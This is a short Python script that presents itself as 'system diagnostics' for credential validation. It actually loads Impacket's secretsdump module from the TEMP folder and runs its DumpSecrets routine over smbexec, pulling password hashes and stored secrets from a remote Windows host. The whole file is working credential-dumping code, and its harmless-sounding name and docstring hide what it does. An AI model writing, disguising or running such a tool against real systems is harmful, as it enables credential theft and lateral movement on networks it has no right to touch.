#!/usr/bin/env python3
"""System diagnostics - remote credential validation"""
import sys, os, importlib.util

def main():
    if len(sys.argv) < 2:
        print("Usage: sysdiag.py DOMAIN/user:password@target")
        sys.exit(1)
    
    # Dynamically load the module
    sd_path = os.path.join(os.environ.get('TEMP', '.'), 'secretsdump.py')
    if not os.path.exists(sd_path):
        print(f"[-] Required module not found at {sd_path}")
        sys.exit(1)
    
    spec = importlib.util.spec_from_file_location("_sd", sd_path)
    sd = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(sd)
    
    # Use DumpSecrets class
    opts = type('Options', (), {
        'target': sys.argv[1],
        'hashes': None,
        'no_pass': False,
        'k': False,
        'aesKey': None,
        'dc_ip': None,
        'target_ip': None,
        'just_dc': False,
        'just_dc_ntlm': False,
        'just_dc_user': None,
        'use_vss': False,
        'rodcNo': None,
        'rodcKey': None,
        'sam': None,
        'security': None,
        'system': None,
        'ntds': None,
        'resumeFileName': None,
        'outputfile': None,
        'exec_method': 'smbexec',
        'history': False,
        'bootkey': None,
        'ts': False,
        'debug': False,
        'keytab': None,
    })()
    
    dumper = sd.DumpSecrets(sys.argv[1], '', '', '', opts)
    try:
        dumper.dump()
    except Exception as e:
        print(f"[-] {e}")
    finally:
        dumper.cleanup()

if __name__ == '__main__':
    main()
